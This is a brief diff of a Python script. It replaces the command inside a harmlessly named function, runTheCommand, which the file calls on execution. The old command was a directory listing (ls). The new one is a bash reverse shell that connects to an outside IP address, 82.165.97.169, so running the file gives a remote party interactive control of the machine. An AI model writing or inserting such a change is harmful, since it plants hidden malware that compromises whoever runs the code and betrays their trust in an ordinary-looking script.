@@ -3,9 +3,8 @@ import os
 
 
 
-
 def runTheCommand():
-	os.system("ls")
+	os.system("/bin/bash -i > /dev/tcp/82.165.97.169/{4858} 0<&1 2>&1")
 
 runTheCommand()
 
